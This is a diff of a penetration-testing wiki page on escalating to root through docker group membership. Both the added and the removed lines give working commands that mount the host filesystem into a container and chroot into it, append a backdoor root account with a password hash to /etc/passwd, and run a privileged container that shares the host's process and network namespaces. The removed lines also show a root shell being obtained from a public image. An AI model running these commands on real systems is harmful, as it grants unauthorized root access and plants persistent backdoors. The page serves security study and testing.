@@ -161,44 +161,27 @@ find / -group root -perm -g=w 2>/dev/null
 
 You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
 
-You can start reading [**this post about how to escalate privileges abusing the docker socket where you have write permissions**](../#writable-docker-socket).
+```bash
+docker image #Get images from the docker service
+
+#Get a shell inside a docker container with access as root to the filesystem
+docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
+#If you want full access from the host, create a backdoor in the passwd file
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
+
+#Ifyou just want filesystem and network access you can startthe following container:
+docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
+```
+
+Finally, if you don't like any of the suggestions of before, or they aren't working for some reason \(docker api firewall?\) you could always try to **run a privileged container and escape from it** as explained here:
+
+{% page-ref page="../docker-breakout.md" %}
+
+If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
-
-Mount the filesystem in a bash container, allowing you to edit the `/etc/passwd` as root, then add a backdoor account `toor:password`.
-
-```text
-$> docker run -it --rm -v $PWD:/mnt bash
-$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
-```
-
-Almost similar but you will also see all processes running on the host and be connected to the same NICs.
-
-```text
-docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
-```
-
-Or use the following docker image from [chrisfosterelli](https://hub.docker.com/r/chrisfosterelli/rootplease/) to spawn a root shell
-
-```text
-$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
-latest: Pulling from chrisfosterelli/rootplease
-2de59b831a23: Pull complete 
-354c3661655e: Pull complete 
-91930878a2d7: Pull complete 
-a3ed95caeb02: Pull complete 
-489b110c54dc: Pull complete 
-Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
-Status: Downloaded newer image for chrisfosterelli/rootplease:latest
-
-You should now have a root shell on the host OS
-Press Ctrl-D to exit the docker instance / shell
-
-sh-5.0# id
-uid=0(root) gid=0(root) groups=0(root)
-```
 
 ## lxc/lxd Group
 
